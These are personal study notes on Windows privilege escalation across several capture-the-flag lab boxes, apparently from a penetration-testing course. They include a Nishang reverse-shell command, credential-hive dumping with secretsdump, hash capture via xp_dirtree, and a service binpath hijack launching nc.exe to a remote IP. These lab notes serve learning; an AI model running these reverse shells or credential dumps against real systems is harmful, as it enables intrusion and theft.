#Windows #PrivEsc 

CTF Boxes:
1. [[Netmon - HTB]]
2. [[Arctic - HTB]]
3. Bastard
4. Bastion
5. Querier

1. box 1
	- TCM used CVE-2009-2265
2. box 2
	1. Copy the link here - Basic PowerShell for Beginners (HackTricks)
	- TCM created a msfvenom payload for popping a user shell instead of doing nc like I did
	- TCM used #Sherlock(Sherlock.ps1) for PrivEsc and MS16-014 (kernel exploit from THM lab)
		- PrivEsc MS15-051
		- I just did JuicyPotato and rooted it...
3. Box 3 - I substituted this box for HTB boxes (Netmon AND Access), but HTB Jeeves is more similar
	1. the Alfred THM box
		1. web portal enumeration
		2. `admin:admin` logs in as default
		3. In configure tab, can run windows batch command, get revshell
			1. #Invoke-PowerShellTCP Invoke-PowerShellTCP.ps1 #Nishang Nishang!
				1. `Invoke-PowerShellTCP -Reverse -IPAddress <ip> -Port <port>`
				2. catch with `nc`
		4. TCM used MSF handler and transfered a msfvenom payload,
			1. Impersonated with incognito by migrating to process running as NET AUTHORITY/SYSTEM since MSF `getshell` was not working
				1. can do juicypotato tho like from Jeeves without MSF04
4. Box 4
	1. Copy link here - Mounting VHD Files
	2. Different mounting steps, i downloaded vhd then mounted, TCM created share drive with smb share and mounted from there (quicker and didnt download)
	3. Also used secretsdump to find password hash
		1. TCM grabbed SYSTEM and SECURITY files as well from `C:\Windows\System32\config` and added that to secretsdump
			1. This resulted in LSA dump with cleartext
5. Box 5
	1. Copy link from video
	2. TCM used #binwalk , should use with #olevba next time
		1. `binwalk -e <file>`
		2. `cd <folder extracted>`
		3. `cat vbaProject.bin`
	3. TCM used #smbserver instead of #Responder (did this because the `reporting` account could not run `xp_cmdshell` so we caught a hash as the service account and it can run that)
		1. #xp_dirtree ==Add more about this command in formal way and smbserver use for hashes==
	4. TCM #PowerUp found binary path vulnerability with `UsoSvc`... my #PowerUp showed cleartext password in GPP
		1. TCM changed the #binpath config for `USoSvc`
			1. `sc config UsoSvc binpath="C:\Reports\nc.exe 10.10.14.5 5555 -e cmd.exe"`
			2. `sc qc UsoSvc
			3. `sc stop UsoSvc`
			4. `nc -lnvp 5555`
			5. `sc start UsoSvc`


http://github.com/peterrakolcza/PNPT-study-guide/tree/main/Exam%20tips
